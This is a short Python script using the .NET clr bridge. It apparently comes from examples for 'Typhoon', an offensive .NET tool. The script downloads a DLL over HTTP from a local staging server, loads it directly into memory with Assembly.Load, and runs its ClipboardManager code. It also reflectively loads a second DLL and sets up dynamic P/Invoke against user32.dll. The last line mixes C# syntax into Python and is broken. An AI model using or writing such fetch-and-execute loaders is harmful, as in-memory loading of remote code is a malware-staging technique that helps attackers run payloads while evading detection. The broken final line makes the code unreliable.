import clr

clr.AddReference("System")
clr.AddReference("System.IO.Compression")
from System.Net import WebClient
from System.Net import ServicePointManager, SecurityProtocolType
from System.IO import Stream, StreamReader, MemoryStream, BinaryWriter, FileStream, File
from System.IO.Compression import ZipArchive, ZipArchiveMode


with WebClient() as wc:
    ServicePointManager.SecurityProtocol  = SecurityProtocolType.Tls12
    dll = wc.DownloadData("http://127.0.0.1:8000/tmpB1B9.dll")

#from System import AppDomain, AppDomainSetup, MarshalByRefObject
from System.Environment import CurrentDirectory 
from System.IO import Path, Directory 
from System.Reflection import Assembly 


print(".Net Type: ", clr.GetClrType(type(dll)) )
print("Python Type: ",  type(dll) )

# Byte loading, allowed in DLR, disallowed in .Net Classic, allowed in Core??
clr.AddReference(Assembly.Load(dll))
from Typhoon.Extensions import ClipboardManager

cm = ClipboardManager()
cm.RunCode()

######## Example: Load Dynamic P/Invoke DLLImport
# .\Typhoon.exe -mode=comp  -type=cs -resource=..\..\Examples\DynamicDllImport.cs
# Via File read 
assemblyName="tmpC016.dll"

#assemblyBytes = File.ReadAllBytes(assemblyName)
from System.IO import File
clr.AddReference(Assembly.Load(File.ReadAllBytes(assemblyName)))
from Typhoon import DynamicDllImport

DynamicDllImport("user32.dll", callingConvention: CallingConvention.Winapi);




